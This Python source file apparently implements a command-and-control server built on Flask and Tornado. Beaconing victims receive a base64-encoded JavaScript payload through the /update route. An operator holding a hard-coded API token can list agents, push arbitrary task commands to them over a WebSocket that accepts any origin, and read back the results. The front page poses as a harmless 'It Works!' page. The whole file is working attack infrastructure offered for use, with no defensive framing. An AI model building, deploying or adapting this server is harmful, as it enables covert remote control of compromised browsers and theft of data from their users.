from flask import Flask, render_template, Response, request,make_response
from tornado.wsgi import WSGIContainer
from tornado.web import Application, FallbackHandler
from tornado.websocket import WebSocketHandler
from tornado.ioloop import IOLoop
import random
import base64,json,string,re

with open("custom_payload.js", "rb") as f:
	payload_bytes = f.read()

payload = base64.b64encode(payload_bytes)
live_sockets = set()
staged_sessions = set()
tasks = []
running_id = 1
permanentApiToken = "dbylwfcm3e7d4076w243dp56fkzi4cguqaw27dpe"#''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(40))
app = Flask('flasknado')

class WebSocket(WebSocketHandler):
	id=''
	def check_origin(self, origin):
		return True

	def open(self):
		print("Socket opened")
		live_sockets.add(self)

	def on_message(self, message):
		if message.startswith("init "):
			self.id = message.split()[1]
			print("Initialized Session "+self.id)
		else:
			json_msg = json.loads(message)
			print("Recieved Response: " + str(json_msg['id']) + " " + str(json_msg['status']))
			for t in tasks:
				if t['id'] == json_msg['id']:
					t['response']=json_msg['text']

	def on_close(self):
		print("Socket closed.")
		live_sockets.remove(self)
		staged_sessions.remove(self.id)

@app.before_request
def check_token():
	tokenAllowed = re.compile("^[0-9a-z]{40}")
	if request.path != '/update':
		token = request.args.get('token')
		if (not token) or (not tokenAllowed.match(token)):
			return make_response('', 401)
		if token != permanentApiToken:
			return make_response('', 401)

@app.route('/')
def index():
	return Response("<body><h1>It Works!</h1></body>",mimetype='text/html') 

@app.route('/task/create',methods=['POST'])
def create_task():
	global running_id
	tasking = request.json
	if tasking['task_cmd'] is not None:
		for s in live_sockets:
			if s.id == tasking['agent_id']:
				new_task = {}
				new_task['task_cmd'] = tasking['task_cmd']
				new_task['id'] = running_id
				new_task['data'] = tasking['data']
				new_task_str = json.dumps(new_task)
				s.write_message(new_task_str)
				new_task['response']=""
				tasks.append(new_task)
				running_id=running_id+1
				reply ={}
				reply['task_id'] = new_task['id']
				return Response (json.dumps(reply))
		return Response ("ERROR: No Agent Found")
	else:
		return Response ("ERROR: No agent found with that ID")

@app.route('/task/<task_id>/get',methods=['GET'])
def query_task(task_id):
	for t in tasks:
		if t['id'] == int(task_id):
			return Response (json.dumps(t))
	return Response("ERROR - Task not found")

@app.route('/agents/list',methods=['GET'])
def list_agents():
	reply = {}
	reply['agents']= list(staged_sessions)
	return Response(json.dumps(reply))

@app.route('/update')
def update():
	global staged_sessions
	session_id = request.args.get('id')
	if session_id not in staged_sessions:
		print "Initial beacon from: "+session_id
		staged_sessions.add(session_id)
		return Response(payload,mimetype='plain/text')
	else:
		return '{"message":"error"}'

if __name__ == "__main__":
	container = WSGIContainer(app)
	server = Application([
		(r'/websocket/', WebSocket),
		(r'.*', FallbackHandler, dict(fallback=container))
	])
	print("Starting server... API Token: "+permanentApiToken)
	server.listen(80)
	IOLoop.instance().start()
